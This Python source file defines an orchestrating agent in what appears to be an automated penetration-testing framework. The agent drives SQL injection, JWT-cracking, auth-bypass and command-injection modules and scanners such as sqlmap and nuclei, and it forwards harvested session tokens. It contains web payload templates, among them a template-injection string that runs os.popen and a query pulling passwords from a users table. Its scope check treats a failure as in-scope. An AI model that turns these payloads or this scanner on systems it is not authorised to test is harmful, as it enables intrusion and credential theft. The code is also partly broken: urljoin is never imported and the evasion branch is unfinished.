import asyncio
import base64
import json
import logging
import re
import time
import urllib.parse
from datetime import datetime

from backend.agents._shared import (
    ControlSignalMixin,
    ScanContextRecorderMixin,
    SessionLifecycleMixin,
    SkillRecallMixin,
)
from backend.ai.cortex import get_cortex_engine
from backend.api.socket_manager import publish_request_event
from backend.core.browser_agent import BrowserEnabledAgent
from backend.core.content_boundary import content_boundary
from backend.core.hive import EventType, HiveEvent
from backend.core.protocol import AgentID, JobPacket, ModuleConfig, TaskPriority, TaskTarget
from backend.core.proxy import network_interceptor
from backend.core.unified_knowledge_graph import graph_engine

logger = logging.getLogger("AgentSigma")

# Import Arsenals
from backend.modules.logic.chronomancer import Chronomancer
from backend.modules.logic.doppelganger import Doppelganger
from backend.modules.logic.escalator import TheEscalator
from backend.modules.logic.skipper import TheSkipper
from backend.modules.logic.tycoon import TheTycoon
from backend.modules.tech.auth_bypass import AuthBypassTester
from backend.modules.tech.command_injection import CommandInjectionProbe
from backend.modules.tech.jwt import JWTTokenCracker
from backend.modules.tech.sqli import SQLInjectionProbe


class SigmaAgent(
    SkillRecallMixin, SessionLifecycleMixin, ControlSignalMixin, ScanContextRecorderMixin, BrowserEnabledAgent
):
    """
    AGENT SIGMA: THE ORCHESTRATOR
    Role: Execution Pipeline & Generative Weaponssmith with Browser-Aware Payloads.
    Capabilities:
    - Hosts all 9 Arsenal Modules natively.
    - Resolves pure math payloads to network IO state arrays.
    - AI-Powered Context-Aware Payload Generation.
    - Browser-aware payload generation based on DOM structure
    - Form-specific payload targeting
    - Framework-specific exploits
    """

    def __init__(self, bus):
        super().__init__("agent_sigma", bus)

        # CORTEX AI Generator
        try:
            self.ai = get_cortex_engine()
        except Exception as e:
            logger.debug(f"[{self.name}] AI Engine initialization deferred: {e}")
            self.ai = None

        # Stage 10 Hardening: Persistent session for high-concurrency network tasks
        self._session = None
        # Governance: throttle flag from Zeta
        self._throttled = False

        # Hybrid Engine State Map
        self.hybrid_token = None

        self.arsenal = {
            "tech_sqli": SQLInjectionProbe(),
            "tech_jwt": JWTTokenCracker(),
            "tech_auth_bypass": AuthBypassTester(),
            "tech_cmdi": CommandInjectionProbe(),
            "logic_tycoon": TheTycoon(),
            "logic_doppelganger": Doppelganger(),
            "logic_skipper": TheSkipper(),
            "logic_chronomancer": Chronomancer(),
            "logic_escalator": TheEscalator(),
        }

        self.payload_templates = [
            "<script>alert('{context_var}')</script>",
            "UNION SELECT {context_table}, password FROM users--",
            "{{{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}}}",
        ]

        # ── Sigma-exclusive tool dispatch (Architecture §5.2, §29.4) ──────────
        # Sigma owns 5 validation/fingerprint tools exclusively (nuclei, httpx,
        # dalfox, whatweb, wafw00f). These are registered in SIGMA_TOOLS and
        # are NEVER dispatched by Alpha. Sigma decides per vuln hypothesis
        # whether to use a built-in module, browser action, or governed CLI
        # tool. Mirrors the Hermes availability-aware dispatch.
        #
        # Technique → candidate Sigma-exclusive CLI validators, in preference
        # order. Only tools in SIGMA_TOOLS can be dispatched here.
        self._technique_tool_map = {
            "tech_sqli": ["sqlmap"],  # sqlmap preferred; in-process module fallback
            "tech_jwt": [],
            "tech_auth_bypass": [],
            "recon_nuclei": ["nuclei"],  # Sigma-exclusive
            "recon_httpx": ["httpx"],  # Sigma-exclusive
            "tech_xss": ["dalfox"],  # Sigma-exclusive
            "tech_cve": ["nuclei"],  # Sigma-exclusive
            "tech_fingerprint": ["httpx", "whatweb", "wafw00f"],  # all Sigma-exclusive
            "server_scan": ["nikto"],  # web server misconfig scanning
            "cms_scan": ["wpscan"],  # WordPress detection/scanning
        }
        # Per-path reliability ledger (Architecture §29: "update tool
        # reliability"). Keyed by path id, e.g. "cli:nuclei", "module:tech_sqli".
        self._path_reliability: dict = {}
        # Short-TTL tool availability cache (Hermes check_fn TTL pattern) so
        # repeated dispatch decisions don't re-probe PATH/tool-root/Docker.
        self._tool_avail_cache: dict = {}
        self._tool_avail_ttl = 30.0

    async def setup(self):
        # Listen for requests to generate payloads (e.g. from Beta)
        self.bus.subscribe(EventType.JOB_ASSIGNED, self.handle_generation_request)
        # Sequence Hybrid Integration: DOM Token Extractor
        self.bus.subscribe(EventType.JOB_COMPLETED, self.handle_hybrid_result)
        # Governance: respond to Zeta's control signals (shared mixin).
        self.subscribe_control(self.bus)

    async def stop(self):
        """Gracefully release the persistent generative execution session to prevent socket exhaustion."""
        # SessionLifecycleMixin handles the close+null-out behaviour Sigma
        # used to inline; semantics are identical.
        await self._close_session()
        await super().stop()

    async def handle_hybrid_result(self, event: HiveEvent):
        """Consume PinchTab tokens harvested by AgentDelta."""
        if event.source == "agent_delta" and isinstance(event.payload, dict):
            token = event.payload.get("data", {}).get("dom_token")
            if token:
                self.hybrid_token = token
                logger.debug(
                    f"[{self.name}] [HYBRID FUSION] Assimilated live DOM token: {token[:10]}... Incoming attack sequences updated."
                )

    # NOTE: handle_control_signal is inherited from ControlSignalMixin —
    # behaviour matches the original inline handler exactly (THROTTLE /
    # STEALTH_MODE -> _throttled=True, RESUME -> _throttled=False).

    async def _fetch(self, target: TaskTarget, scan_id: str = None) -> tuple[TaskTarget, str]:
        try:
            kwargs = {}
            # Build outbound headers from a COPY of target.headers so the
            # seeder's auth Cookie / Authorization survive across vectors and
            # per-payload mutations don't bleed back into the shared TaskTarget
            # (which is the same Pydantic instance for every payload Sigma
            # sends per packet).
            request_headers = dict(target.headers or {})
            content_type = request_headers.get("Content-Type") or request_headers.get("content-type") or ""
            if target.payload and target.method.upper() in ["POST", "PUT", "PATCH"]:
                if "application/x-www-form-urlencoded" in content_type:
                    kwargs["data"] = target.payload
                else:
                    kwargs["json"] = target.payload

            # Stage 10 Optimization: Reuse persistent session to prevent port
            # exhaustion. ``_get_session`` (SessionLifecycleMixin) lazily
            # creates one with the same 10s timeout we used inline before.
            session = await self._get_session()

            # HYBRID FUSION: Inject DOM Scraped Token into Live Fetch Header
            # ONLY when no Authorization is already provided by the seeder, and
            # only on the local copy so we don't clobber the upstream packet.
            if self.hybrid_token and "Authorization" not in request_headers and "authorization" not in request_headers:
                request_headers["Authorization"] = f"Bearer {self.hybrid_token}"

            response = await network_interceptor.fetch(
                target.method,
                target.url,
                session=session,
                headers=request_headers,
                timeout=10,
                **kwargs,
            )
            text = response.body[: 5 * 1024 * 1024]
            latency = response.elapsed_ms

            # [V7] Publish real-time telemetry for Sigma interactions
            await publish_request_event(
                {
                    "timestamp": datetime.now().strftime("%H:%M:%S"),
                    "method": target.method,
                    "endpoint": target.url[-40:] if len(target.url) > 40 else target.url,
                    "payload": str(target.payload)[:25],
                    "status": response.status,
                    "latency": latency,
                    "agent": "sigma_orchestrator",
                    "result": "OK" if response.status < 400 else "ERROR",
                },
                scan_id=scan_id,
            )

            safe_text = content_boundary.wrap_http_response(response.status, response.headers, text, response.url)
            return target, safe_text
        except Exception as e:
            logger.debug(f"[{self.name}] [FETCH ERROR] {target.url}: {e}")
            return target, ""

    def _tool_available(self, tool: str) -> bool:
        """Availability-aware check for a Sigma-exclusive CLI tool.

        Sigma owns 5 tools exclusively (nuclei, httpx, dalfox, whatweb, wafw00f)
        as defined in SIGMA_TOOLS. This method checks install state via the
        unified registry (check_tool_availability resolves from ALL_TOOLS).
        Results are TTL-cached so repeated dispatch decisions are cheap."""
        now = time.time()
        cached = self._tool_avail_cache.get(tool)
        if cached and (now - cached[0]) < self._tool_avail_ttl:
            return cached[1]
        available = False
        try:
            from backend.tools.recon.registry import SIGMA_TOOLS, check_tool_availability

            # Only allow Sigma to dispatch tools it exclusively owns.
            if tool not in SIGMA_TOOLS:
                logger.debug(f"[{self.name}] Tool '{tool}' is not in SIGMA_TOOLS, rejecting.")
                self._tool_avail_cache[tool] = (now, False)
                return False
            available = bool(check_tool_availability(tool).get("installed"))
        except Exception as e:
            logger.debug(f"[{self.name}] Tool availability check failed for {tool}: {e}")
            available = False
        self._tool_avail_cache[tool] = (now, available)
        return available

    def _path_reliability_score(self, path_id: str) -> float:
        """Prior reliability for a path id (e.g. "cli:nuclei", "module:tech_sqli").
        Architecture §29 self-improvement: "update tool reliability". Starts
        neutral (0.5) and is nudged by observed outcomes via _record_path_outcome."""
        stats = self._path_reliability.get(path_id)
        if not stats or stats.get("runs", 0) <= 0:
            return 0.5
        return stats["successes"] / stats["runs"]

    def _record_path_outcome(self, path_id: str, success: bool) -> None:
        """Record a validation-path outcome so future dispatch favours paths
        that have historically worked on this engagement."""
        stats = self._path_reliability.setdefault(path_id, {"runs": 0, "successes": 0})
        stats["runs"] += 1
        if success:
            stats["successes"] += 1

    async def _select_validation_path(self, module_id: str, packet, scan_id: str) -> dict:
        """Decide the RIGHT controlled validation path per vuln hypothesis:
        built-in module vs browser action vs governed CLI tool (Architecture
        §5.2 technique↔tooling bridge; §29.4 Sigma = tool/technique commander).

        Adopts the Hermes availability-aware dispatch (tools/registry): a CLI
        path is only chosen when the tool is actually runnable AND the target is
        in scope AND its prior reliability beats the in-process module. Skill
        recommendations (§29: "Sigma receives technique-selection skills") and
        graph reliability bias the decision."""
        recs = []
        try:
            from backend.core.skill_library import skill_library

            vuln_class = module_id.replace("tech_", "").replace("logic_", "")
            recs = skill_library.get_recommendations(target_url=packet.target.url, vuln_class=vuln_class, limit=5)
        except Exception as e:
            logger.debug(f"[{self.name}] Skill library recall failed: {e}")
            recs = []

        url = packet.target.url

        # 1. Candidate CLI validators for this technique, filtered by REAL
        #    availability (Hermes: only surface tools whose check_fn passes).
        candidates = self._technique_tool_map.get(module_id, [])
        available_tools = [t for t in candidates if self._tool_available(t)]

        # 2. Scope is law (Architecture §10): a CLI validation touches the
        #    network, so it must be in scope before it is even a candidate.
        in_scope = True
        try:
            from backend.core.scope import scope_guard

            in_scope = scope_guard.allows(url)
        except Exception as e:
            logger.debug(f"[{self.name}] Scope check failed, defaulting to in-scope: {e}")
            in_scope = True

        # 3. Skill recommendations can steer toward tool orchestration when a
        #    matching high-confidence skill is recalled.
        skill_prefers_tool = any(
            r.get("score", 0) >= 0.6 and "tool" in (r.get("skill_type", "") or "").lower() for r in recs
        )

        if available_tools and in_scope:
            # 4. Reliability-aware choice (Hermes prefers the path most likely
            #    to succeed): pick the most reliable available tool and only
            #    take the CLI path if it beats the in-process module — unless a
            #    skill explicitly recommends tooling.
            best_tool = max(available_tools, key=lambda t: self._path_reliability_score(f"cli:{t}"))
            cli_score = self._path_reliability_score(f"cli:{best_tool}")
            module_score = self._path_reliability_score(f"module:{module_id}")
            if skill_prefers_tool or cli_score >= module_score:
                return {
                    "path": "cli_tool",
                    "tool": best_tool,
                    "skills": recs,
                    "reason": "skill" if skill_prefers_tool else "reliability",
                    "cli_score": round(cli_score, 3),
                    "module_score": round(module_score, 3),
                }

        # 5. In-process module is the default controlled validation path when it
        #    exists; otherwise fall back to a browser action (DOM/SPA targets).
        if module_id in self.arsenal:
            return {
                "path": "module",
                "skills": recs,
                "unavailable_tools": [t for t in candidates if t not in available_tools],
            }
        return {"path": "browser", "skills": recs}

    async def _run_cli_validation(self, vp: dict, packet, scan_id: str) -> None:
        """Run a CLI validation tool via the governed Terminal Engine
        (Architecture §5.2, §8, §29.11 item 4: Sigma access to governed terminal
        execution). argv-only, scope-checked, budgeted, audited.

        The seeder's authenticated session (packet.target.headers Cookie) is
        forwarded to every CLI tool so they validate the REAL logged-in app
        instead of bouncing off the login redirect. Nuclei gets the tuned,
        bounded flag set (same -as auto-scan used by recon) so a single target
        finishes inside the watchdog instead of a 5-minute full sweep.
        Confirmed findings in nuclei/dalfox output are published as
        VULN_CONFIRMED so they reach the dashboard and report."""
        from pathlib import Path

        from backend.core.iteration_budget import budget_config
        from backend.core.terminal_engine import terminal_engine

        tool = vp.get("tool")
        url = packet.target.url
        # Nuclei templates carry their own relative paths (login.php, setup.php,
        # exposed-panel probes). Pointing nuclei at the seeded deep URL (e.g.
        # /vulnerabilities/sqli/?id=1) makes every template test THAT page only —
        # the dvwa-default-login template would never reach /login.php and the
        # run returns 0 findings. Run nuclei against the origin instead so
        # templates enumerate the full app surface.
        parsed_url = urllib.parse.urlsplit(url)
        origin = f"{parsed_url.scheme}://{parsed_url.netloc}/" if parsed_url.scheme else url
        out = Path("data") / "scans" / scan_id / "sigma" / f"{tool}.out"
        # Forward the seeder's auth context (Cookie/Authorization) so CLI
        # validators hit the authenticated application.
        headers = dict(packet.target.headers or {})
        cookie = headers.get("Cookie") or headers.get("cookie") or ""
        auth_header = headers.get("Authorization") or headers.get("authorization") or ""
        nuclei_h = []
        dalfox_h = []
        whatweb_h = []
        httpx_h = []
        wafw00f_h = []
        # wafw00f's -H takes a HEADERS FILE path, not an inline header — write
        # the auth context to a file and pass that (a bare `-H 'Cookie: ...'`
        # makes wafw00f try to open the literal string as a file and exit 2).
        wafw00f_h = []
        if cookie:
            nuclei_h = ["-H", f"Cookie: {cookie}"]
            dalfox_h = ["--header", f"Cookie: {cookie}"]
            whatweb_h = ["--header", f"Cookie: {cookie}"]
            httpx_h = ["-H", f"Cookie: {cookie}"]
            hf = Path("data") / "scans" / scan_id / "sigma" / "wafw00f_headers.txt"
            hf.parent.mkdir(parents=True, exist_ok=True)
            hf.write_text(f"Cookie: {cookie}\n", encoding="utf-8")
            wafw00f_h = ["-H", str(hf)]
        elif auth_header:
            nuclei_h = ["-H", f"Authorization: {auth_header}"]
            dalfox_h = ["--header", f"Authorization: {auth_header}"]
            whatweb_h = ["--header", f"Authorization: {auth_header}"]
            httpx_h = ["-H", f"Authorization: {auth_header}"]
            hf = Path("data") / "scans" / scan_id / "sigma" / "wafw00f_headers.txt"
            hf.parent.mkdir(parents=True, exist_ok=True)
            hf.write_text(f"Authorization: {auth_header}\n", encoding="utf-8")
            wafw00f_h = ["-H", str(hf)]
        # Nuclei runs in TWO passes: the fast, deterministic default-credential
        # pass (-tags default-login — the single `-as` auto-scan sweep reliably
        # MISSES templates like dvwa-default-login due to per-template
        # two-request session-token races at sweep concurrency), then a bounded
        # general CVE sweep for broad coverage. Both use the tuned bounded flag
        # set (rl/c concurrency caps, exclude fuzz/dos) so a single target
        # finishes inside the 180s watchdog.
        # NOTE: the default-login pass deliberately omits the forwarded Cookie.
        # Those templates run their OWN session handshake (GET login.php ->
        # extract PHPSESSID/user_token -> POST). A global `-H Cookie:` merges
        # with the template's Cookie into a duplicate header that breaks the
        # handshake (verified against DVWA: same flags match without the cookie,
        # 0 findings with it). Default-credential checks need no prior auth
        # anyway. The general CVE sweep DOES forward the cookie so authenticated
        # templates test the real logged-in surface.
        argv_map = {
            "nuclei": [
                [                    "nuclei", "-u", origin, "-tags", "default-login",
                    "-severity", "critical,high,medium",
                    "-timeout", "5", "-retries", "0", "-c", "1",
                    "-stats", "-stats-interval", "15",
                    "-exclude-tags", "fuzz,dos", "-jsonl", "-silent",
                ],
                [
                    "nuclei", "-u", origin, "-severity", "critical,high",
                    "-timeout", "5", "-retries", "0", "-rl", "150", "-c", "15",
                    "-stats", "-stats-interval", "20",
                    "-exclude-tags", "fuzz,dos", "-jsonl", "-silent", *nuclei_h,
                ],
            ],
            "httpx": [["httpx", "-u", url, "-tech-detect", "-status-code", "-json", "-silent", *httpx_h]],
            "dalfox": [["dalfox", "url", url, "--format", "json", "--silence", "--skip-headless", *dalfox_h]],
            "whatweb": [["whatweb", "--log-json=-", url, *whatweb_h]],
            "wafw00f": [["wafw00f", url, *wafw00f_h]],
            # sqlmap: bounded to a single GET test on the seeded URL; the auth
            # cookie rides along so DVWA's login-gated SQLi pages are actually
            # testable. --batch avoids interactive prompts; --timeout + --retries
            # bound the runtime so the whole pass stays inside the watchdog.
            # --fresh-queries: sqlmap caches per-target results in its session
            # store and replays them on re-scans of the same URL (stale findings
            # dated from previous runs were observed); force a live re-test.
            "sqlmap": [
                [
                    "sqlmap", "-u", url, "--batch", "--level", "1", "--risk", "1",
                    "--timeout", "8", "--retries", "0", "--threads", "2",
                    "--fresh-queries",
                    "--output-dir", str(Path("data") / "scans" / scan_id / "sigma" / "sqlmap"),
                    *( [] if not cookie else ["--cookie", cookie] ),
                ]
            ],
            # nikto: quick web-server scan, JSON output for the parser.
            "nikto": [
                ["nikto", "-h", url, "-nointeractive", "-Format", "json", "-o", str(out)]
            ],
            # wpscan: WordPress only — fast no-api scan, safe checks only.
            "wpscan": [
                ["wpscan", "--url", url, "--no-banner", "--random-user-agent", "--disable-tls-checks", "--format", "json"]
            ],
        }
        passes = argv_map.get(tool)
        if not passes:
            return
        # Multi-pass tools write to per-pass files (second pass must not
        # clobber the first); finding parsing merges all pass outputs below.
        results = []
        for idx, argv in enumerate(passes):
            pass_out = out if len(passes) == 1 else out.with_name(f"{out.stem}_p{idx + 1}{out.suffix}")
            budget = budget_config.make("commander", label=f"sigma:{tool}:{idx + 1}")
            result = await terminal_engine.run(
                argv,
                scan_id=scan_id,
                agent=self.name,
                output_path=pass_out,
                timeout_seconds=180,
                budget=budget,
                parser_hint="jsonl",
            )
            results.append(result)
            # Reliability feedback (Architecture §29: "update tool reliability"):
            # the governed result's status feeds the next dispatch decision.
            # wpscan exits 4 on non-WordPress targets — that's a CORRECT verdict
            # ("remote site is up but not WordPress"), not a tool failure, so it
            # must not poison the reliability scorer into dropping wpscan.
            _ok = result.status == "finished" or (
                tool == "wpscan" and result.exit_code == 4
            )
            self._record_path_outcome(f"cli:{tool}", success=_ok)
        logger.info(
            f"[{self.name}] CLI validation finished tool={tool} passes={len(results)} "
            f"statuses={[r.status for r in results]}"
        )
        await self.bus.publish(
            HiveEvent(
                type=EventType.LIVE_ATTACK,
                source=self.name,
                scan_id=scan_id,
                payload={
                    "url": url,
                    "arsenal": f"Terminal:{tool}",
                    "action": "Governed CLI validation",
                    "payload": ",".join(r.status for r in results),
                },
            )
        )
        # Surface REAL findings from validation output as VULN_CONFIRMED so
        # the dashboard/report capture them. Each tool emits a different shape:
        #  - nuclei/dalfox: JSONL, one finding per line (info dict + template-id)
        #  - nikto: plain-text report, finding lines are "+ [NNNNN] /path: msg"
        #  - wpscan: single JSON doc (vulnerabilities array / scan_aborted)
        #  - sqlmap: text "parameter 'x' is vulnerable" + Parameter/Type/Payload
        try:
            for result in results:
                if not (result.output_path and Path(result.output_path).exists()):
                    continue
                raw = Path(result.output_path).read_text(encoding="utf-8", errors="replace")

                async def _publish(finding_type: str, f_url: str, severity: str, data: dict, evidence):
                    await self.bus.publish(
                        HiveEvent(
                            type=EventType.VULN_CONFIRMED,
                            source=self.name,
                            scan_id=scan_id,
                            payload={
                                "type": f"{tool.upper()}:{finding_type}",
                                "url": f_url or url,
                                "severity": str(severity).title(),
                                "data": data,
                                "evidence": {"raw": evidence},
                            },
                        )
                    )

                if tool in ("nuclei", "dalfox"):
                    # JSONL: one finding per line.
                    for ln in raw.splitlines()[:50]:
                        try:
                            finding = json.loads(ln)
                        except Exception:
                            continue
                        if not isinstance(finding, dict) or not finding.get("info"):
                            continue
                        info = finding.get("info", {}) if isinstance(finding.get("info"), dict) else {}
                        template_id = str(finding.get("template-id") or info.get("name") or tool)
                        sev = str(info.get("severity") or "high").lower()
                        # FIX (evidence fidelity): nuclei emits
                        # `curl -X 'GET' -d '<body>' ...` for body-parameter
                        # matches — a GET with a body, which most servers and
                        # every HTTP purist reject. Rewrite to POST so the
                        # reproduction command actually replays the match.
                        _curl = finding.get("curl-command") or ""
                        if isinstance(_curl, str) and "-x 'get'" in _curl.lower() and re.search(r"-d\s", _curl, re.IGNORECASE):
                            _curl = re.sub(r"-[xX]\s*'GET'", "-X 'POST'", _curl, count=1)
                        await _publish(
                            template_id,
                            str(finding.get("matched-at") or url),
                            sev,
                            {
                                "tool": tool,
                                "template_id": template_id,
                                "matcher_name": info.get("name"),
                                "tags": info.get("tags"),
                                "matched_at": finding.get("matched-at"),
                                "extractor": finding.get("extractor"),
                            },
                            _curl or finding,
                        )
                elif tool == "nikto":
                    # Plain-text report; finding lines carry a bracketed ID.
                    for ln in raw.splitlines():
                        ln = ln.strip()
                        if not ln.startswith("+"):
                            continue
                        m = re.match(r"\+\s*\[\s*([0-9A-Za-z]+)\s*\]\s*(\S+):\s*(.+)", ln)
                        if not m:
                            continue
                        _id, _path, _msg = m.group(1), m.group(2), m.group(3)
                        if _id.upper() in ("SSL", "OSVDB", "SERVER"):
                            continue
                        await _publish(
                            f"nikto-{_id}",
                            str(urljoin(url, _path)),
                            "medium",
                            {"tool": "nikto", "finding_id": _id, "path": _path, "message": _msg[:300]},
                            ln,
                        )
                elif tool == "wpscan":
                    # Single JSON document.
                    try:
                        doc = json.loads(raw)
                    except Exception:
                        doc = None
                    if isinstance(doc, dict) and doc.get("scan_aborted"):
                        logger.info("[Sigma] wpscan: %s", doc.get("scan_aborted", "")[:120])
                    elif isinstance(doc, dict):
                        version = doc.get("version") or {}
                        vuln_list = []
                        if isinstance(doc.get("vulnerabilities"), list):
                            vuln_list = doc["vulnerabilities"]
                        if isinstance(version.get("vulnerabilities"), list):
                            vuln_list += version["vulnerabilities"]
                        for v in vuln_list[:30]:
                            v_id = str(v.get("id") or v.get("title") or "wpscan-finding")
                            sev = str(v.get("severity") or v.get("cvss", {}).get("severity") or "high").lower()
                            await _publish(
                                v_id,
                                url,
                                sev,
                                {
                                    "tool": "wpscan",
                                    "vuln_id": v_id,
                                    "title": v.get("title"),
                                    "references": v.get("references"),
                                    "cve": v.get("cve"),
                                },
                                v,
                            )
                elif tool == "sqlmap":
                    # Text: two shapes reach the captured file depending on
                    # sqlmap version/mode:
                    #   a) console summary:  "parameter 'x' is vulnerable"
                    #      followed by Parameter/Type/Payload lines
                    #   b) detail-only blocks (observed on --batch runs):
                    #      "Parameter: username (GET)" then Type:/Title:/
                    #      Payload: lines. sqlmap only prints these detail
                    #      blocks for CONFIRMED injectable parameters, so a
                    #      Parameter:+Payload: pair IS a vulnerability.
                    lines = raw.splitlines()
                    published_params = set()
                    for i, ln in enumerate(lines):
                        m = re.search(r"parameter '([^']+)' is vulnerable", ln, re.IGNORECASE)
                        if m:
                            _param = m.group(1)
                        else:
                            # Shape (b): "Parameter: username (GET)" — confirm
                            # only when a Payload: line follows within the block.
                            m = re.match(r"\s*Parameter:\s*([^\s(]+)", ln)
                            if not m:
                                continue
                            _param = m.group(1)
                            window = "\n".join(lines[i : min(i + 12, len(lines))])
                            if not re.search(r"^\s*Payload:", window, re.MULTILINE):
                                continue
                        if _param in published_params:
                            continue
                        published_params.add(_param)
                        # Gather the following Parameter/Type/Title/Payload/
                        # Vector detail block (sqlmap prints it for confirmed
                        # injections; Payload lines carry the proof).
                        _detail = [
                            l.strip() for l in lines[i : i + 14]
                            if re.match(r"\s*(Parameter|Type|Title|Payload|Vector):", l)
                        ]
                        if ln.strip() not in _detail:
                            _detail.insert(0, ln.strip())
                        _block = "\n".join(_detail)[:800]
                        _tech = "".join(
                            re.findall(r"Type:\s*(.+)", _block)[:1]
                        )
                        await _publish(
                            f"sqli:{_param}",
                            url,
                            "critical",
                            {"tool": "sqlmap", "parameter": _param, "technique": _tech.strip(), "detail": _block},
                            _block,
                        )
        except Exception as parse_exc:
            logger.error(f"[{self.name}] CLI validation finding parse failed: {parse_exc}", exc_info=True)
            # Also publish a visible error so the dashboard/events feed shows it
            try:
                await self.bus.publish(
                    HiveEvent(
                        type=EventType.LOG,
                        source=self.name,
                        scan_id=scan_id,
                        payload={"message": f"CLI parse failed for {tool}: {parse_exc}"},
                    )
                )
            except Exception:
                pass

    async def handle_generation_request(self, event: HiveEvent):
        packet_dict = event.payload
        # ScanContext: record event for transcript causality (shared mixin).
        self.record(event)
        try:
            packet = JobPacket(**packet_dict)
        except Exception as e:
            logger.debug(f"[{self.name}] Job packet parse failed: {e}")
            return

        if packet.config.agent_id != AgentID.SIGMA:
            return

        module_id = packet.config.module_id

        # SIGMA AS TECHNIQUE↔TOOLING BRIDGE (Architecture §5.2, §29.4):
        # before executing, consult skill recommendations and decide whether a
        # built-in module, browser action, or CLI tool is the right controlled
        # validation path for this target.
        validation_path = {"path": "module"}
        try:
            validation_path = await self._select_validation_path(module_id, packet, event.scan_id)
            logger.info(
                f"[{self.name}] [DISPATCH] '{module_id}' -> {validation_path.get('path')}"
                f"{(' (' + str(validation_path.get('tool')) + ')') if validation_path.get('tool') else ''}"
                f"{(' reason=' + validation_path.get('reason')) if validation_path.get('reason') else ''}"
            )
            if validation_path.get("path") == "cli_tool":
                await self._run_cli_validation(validation_path, packet, event.scan_id)
        except Exception as _se:
            logger.debug(f"[{self.name}] technique-bridge skipped: {_se}")

        if module_id in self.arsenal:
            logger.info(f"[{self.name}] [PLAN] Orchestrating '{module_id}' execution on {packet.target.url}")

            # STAGE 11: HYBRID GRAPH ENGINE PREDICTION
            predictions = graph_engine.predict_next(module_id, packet.target.url)
            if predictions:
                top_pred = predictions[0]
                logger.debug(
                    f"[{self.name}] [GRAPH AI] Intelligence predicts {top_pred['suggestion']} is {top_pred['confidence']}% likely next."
                )
                # We could mutate the packet here to chain modules, but for safety we just log the intelligence advantage for now.

            module = self.arsenal[module_id]

            # 1. PLAN: Generate target payloads
            # Hard guard: a slow/hung LLM call inside a module (e.g. Gemini rate
            # limited) must NEVER freeze the whole scan. Wrap in a timeout and
            # fall back to an empty target set, which publishes JOB_COMPLETED
            # below and lets the orchestrator continue.
            try:
                targets = await asyncio.wait_for(module.generate_payloads(packet), timeout=60)
            except (asyncio.TimeoutError, TimeoutError):
                logger.error(
                    f"[{self.name}] Payload generation for '{module_id}' timed out after 60s "
                    f"— skipping module to avoid scan stall."
                )
                targets = []
            except asyncio.CancelledError:
                raise
            except Exception as e:
                logger.error(
                    f"[{self.name}] Payload generation for '{module_id}' failed: {e} "
                    f"— skipping module to avoid scan stall."
                )
                targets = []

            # PHASE 2: ROAST (STRICT REJECTION LAYER)
            # Filter targets to ensure they map to PinchTab's semantic reality
            # if Hybrid DOM data exists.
            if packet.config.params and "semantic_state" in packet.config.params:
                semantic = packet.config.params["semantic_state"]
                mapped_targets = [t.get("target") for t in semantic.get("actions_mapped", [])]
                if mapped_targets:
                    valid_targets = []
                    for t in targets:
                        # If a payload targets an unobserved parameter, we ROAST it (Reject)
                        if any(m_target in str(t.payload) for m_target in mapped_targets) or module_id.startswith(
                            "logic"
                        ):
                            valid_targets.append(t)
                    targets = valid_targets
                    logger.debug(
                        f"[{self.name}] [ROAST] Filtered hallucinated vectors. Clean vectors remaining: {len(targets)}"
                    )

            if not targets:
                await self.bus.publish(
                    HiveEvent(
                        type=EventType.JOB_COMPLETED,
                        source=self.name,
                        payload={"job_id": packet.id, "status": "SUCCESS"},
                    )
                )
                return

            # BROADCAST LIVE ATTACK INTENT
            await self.bus.publish(
                HiveEvent(
                    type=EventType.LIVE_ATTACK,
                    source=self.name,
                    scan_id=event.scan_id,
                    payload={
                        "url": packet.target.url,
                        "arsenal": module_id,
                        "action": "Orchestrating multi-vector assault",
                        "payload_count": len(targets),
                    },
                )
            )

            # 2. EXECUTE: Concurrently fetch
            # Cyber-Organism Protocol: Native gathered orchestration
            logger.info(f"[{self.name}] [EXECUTE] Dispatching {len(targets)} asynchronous network tasks...")

            # PERFORMANCE CONTROL: Concurrency & Rate Limiting (Phase 2)
            rps = packet.config.params.get("rps", 100)

            # Governance throttle (Architecture §5.2/§29.4): when Zeta has told
            # us to slow down, halve the requested RPS — never sleep blindly,
            # just pace the dispatch.
            if self._throttled:
                rps = max(1, rps // 2)
                logger.warning(f"[{self.name}] [THROTTLE] Reducing RPS to {rps} under governance signal.")

            # 1/rps = delay between starts to maintain ceiling
            rate_limit_delay = 1.0 / rps if rps > 0 else 0

            # RATE LIMITING FIX: Use a semaphore + inter-request delay to
            # enforce RPS ceiling. Previous code used asyncio.gather with a
            # post-fetch sleep, which fired ALL requests simultaneously.
            semaphore = asyncio.Semaphore(max(1, rps))  # cap inflight

            async def lane_fetch(t, idx: int):
                # Stagger starts: first request fires immediately, subsequent
                # ones are paced at rate_limit_delay apart.
                if idx > 0 and rate_limit_delay > 0:
                    await asyncio.sleep(min(idx * rate_limit_delay, 5.0))
                async with semaphore:
                    await self.bus.publish(
                        HiveEvent(
                            type=EventType.LIVE_ATTACK,
                            source=self.name,
                            scan_id=event.scan_id,
                            payload={
                                "url": t.url,
                                "arsenal": module_id,
                                "action": "Injecting mission-governed payload",
                                "payload": str(t.payload)[:100] + ("..." if len(str(t.payload)) > 100 else ""),
                            },
                        )
                    )
                    return await self._fetch(t, scan_id=event.scan_id)

            results = await asyncio.gather(*[lane_fetch(t, i) for i, t in enumerate(targets)])

            # 3. OBSERVE: Analyze interactions
            logger.debug(f"[{self.name}] [OBSERVE] Applying pure module evaluation...")
            vulns = await module.analyze_responses(list(results), packet)

            # Reliability feedback for the in-process module path so future
            # dispatch decisions (_select_validation_path) learn which technique
            # path actually produces findings (Architecture §29).
            self._record_path_outcome(f"module:{module_id}", success=bool(vulns))

            # REAL-TIME SYNC: Publish VULN_CONFIRMED if found
            if vulns:
                for v in vulns:
                    await self.bus.publish(
                        HiveEvent(
                            type=EventType.VULN_CONFIRMED,
                            source=self.name,
                            scan_id=event.scan_id,
                            payload={
                                "type": module_id.upper(),
                                "url": packet.target.url,
                                "severity": getattr(v, "severity", "HIGH"),
                                "payload": str(packet.target.payload),
                                "evidence": getattr(v, "evidence", "None"),
                            },
                        )
                    )

            await self.bus.publish(
                HiveEvent(
                    type=EventType.JOB_COMPLETED,
                    source=self.name,
                    scan_id=event.scan_id,
                    payload={
                        "job_id": packet.id,
                        "status": "VULN_FOUND" if vulns else "SUCCESS",
                        "vulnerabilities": [v.model_dump() for v in vulns],
                    },
                )
            )
            return

        # 4. IF SIGMA_BYPASS (Weaponssmith generation)
        logger.info(f"[{self.name}] Forging evasion payloads for {packet.target.url}...")

